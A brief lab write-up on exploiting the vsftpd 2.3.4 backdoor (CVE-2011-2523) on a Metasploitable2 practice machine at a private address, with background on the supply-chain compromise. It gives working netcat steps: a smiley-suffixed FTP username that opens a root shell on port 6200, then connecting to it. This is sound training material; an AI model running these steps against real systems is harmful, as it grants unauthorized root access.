# Metasploitable2 -- vsftpd 2.3.4 Backdoor

## CVE
CVE-2011-2523

## Target
- IP: 192.168.110.3
- Service: vsftpd 2.3.4
- Port: 21/tcp

## Background
In 2011 the vsftpd 2.3.4 source code repository was compromised.
A backdoor was inserted that opens a root shell on port 6200
when a username containing :) is sent during FTP login.
This is a supply chain attack i.e the malicious code was in the
official download, not injected at runtime.

## Exploitation

Step 1 -- trigger the backdoor via FTP:
```bash
nc 192.168.110.3 21
# wait for 220 banner, then:
USER backdoor:)
# server responds: 331 Please specify the password.
PASS anything
# terminal hangs -- backdoor is now open on port 6200
```

Step 2 -- connect to the backdoor shell in a second terminal:
```bash
nc 192.168.110.3 6200
whoami  # root
```

## Takeaway
Supply chain attacks are among the most dangerous attack vectors.
The malicious code ships inside legitimate software, bypassing
most security controls. Real world example: SolarWinds 2020.
